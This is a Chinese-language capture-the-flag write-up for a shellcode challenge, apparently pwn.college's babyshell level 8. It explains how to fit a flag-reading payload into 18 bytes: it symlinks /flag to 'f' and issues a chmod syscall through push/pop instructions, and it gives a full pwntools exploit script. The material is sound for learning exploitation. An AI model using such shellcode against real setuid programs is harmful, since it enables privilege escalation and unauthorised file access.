# 挑战简介
编写并执行 shellcode 来读取标志，但只能获得 18 个字节。

# 思路
只能写入18个字节，所以平常mov可就不能用了，因为mov对比push和pop操作整整多了一个字节，所以我们需要考虑灵活应用栈，用push和pop  
而且，/flag如果推进去，可是要花费5个字节，所以我们可以创建链接  
```
ln -s /flag f
```
更多的，如果你要利用open read write来实现读取的话，操作过程也太繁琐，你只需要一个操作，chmod，给与权限从而界外读取
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-8')

p.recvuntil('Reading 0x12 bytes from stdin.\n')

shellcode = asm('''
    push 0x66    /* 将/flag的链接f推入栈 */
    mov rdi, rsp  /* 将rsp基址的值传给rdi */
    push 4       /* 将 4 推入栈，一般为赋给f的权限 */

_stage:
    pop rsi    /* 将4弹出栈，传参给rsi */
    push 90    /* 将值 90 压入栈（Linux x86-64中，90是chmod系统调用号） */
    pop rax     /* 将栈顶值弹出到 rax 寄存器（系统调用号90） */
    syscall
    ret
    ret
    ret
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
